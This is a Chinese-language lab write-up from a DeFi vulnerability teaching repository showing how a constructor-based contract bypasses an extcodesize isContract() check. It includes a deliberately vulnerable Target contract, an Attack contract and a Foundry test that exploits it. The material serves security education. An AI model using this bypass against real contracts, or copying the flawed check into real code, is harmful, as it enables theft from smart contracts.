# 绕过isContract()验证 
[Bypasscontract.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Bypasscontract.sol)  
**名称：** 绕过isContract()验证  
**描述：**   
攻击者只需要在智能合约的构造函数中编写代码，就可以绕过判断是否为智能合约的检测机制。  


**参考：**  
https://www.infuy.com/blog/bypass-contract-size-limitations-in-solidity-risks-and-prevention/  


**Target合约：**  
```
contract Target {
    function isContract(address account) public view returns (bool) {
        // 此方法使用了EVM的‘extcodesize’汇编指令，来检查给定地址处的代码大小
        // 对于在构造过程中的合约，这个方法可能会返回0，因为在构造函数执行的末尾才会存储代码。
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}
```  
**如何测试：**  
forge test --contracts src/test/**Bypasscontract.sol**-vvvv  
```
// 测试攻击合约是否可以绕过目标合约检查的函数。
function testBypassContractCheck() public {
    // 在攻击之前记录Target合约的当前状态。 
    // 这通常会返回一个布尔值，指示合约是否已泄露。
    console.log("Before exploiting, protected status of TargetContract:", TargetContract.pwned());

    // 创建攻击合约的新实例，并将Target合约的地址传递给该实例。
    // 这将启动对目标合约的攻击。
    AttackerContract = new Attack(address(TargetContract));

    // 攻击后再次记录目标合约的状态。
    // 如果攻击成功，则状态应与初始状态不同。
    console.log("After exploiting, protected status of TargetContract:", TargetContract.pwned());

    // 记录一条声明，表明漏洞攻击过程已完成。
    console.log("Exploit completed");
}


// 为攻击Target合约而创建的攻击合约。
contract Attack {
    // 表示当前合约本身是否是一个合约
    bool public isContract;

    // 用于存储当前合约的地址。
    address public addr;

    // 当Attack合约被创建时，构造函数会被触发。
    // 它接受一个目标合约的地址作为参数。
    constructor(address _target) {
        // 调用目标合约的isContract()函数，传递当前合约的地址。
        // 这通常是Target合约中的安全检查，以查看调用方是否为合约。
        // 但是由于这个调用是在构造函数中进行的，isContract()中的extcodesize检查将返回false。
        isContract = Target(_target).isContract(address(this));

        // 将当前合约的地址分配给addr变量。
        addr = address(this);

        // 调用Target合约的protected()函数，该函数可能拒绝合约调用。
        // 然而，由于构造函数中的isContract()检查的漏洞，这次调用实际上是成功的。
        Target(_target).protected();
    }
}
```  
**红框：**  
攻击者只需要在智能合约的构造函数中编写代码，就可以绕过是否为智能合约的检测机制。  
![image](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F273d7caf-d1ec-435a-b60a-ef1dc2698ca1%2FUntitled.png?table=block&id=164fb814-62c9-4308-b378-aba274e06594&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)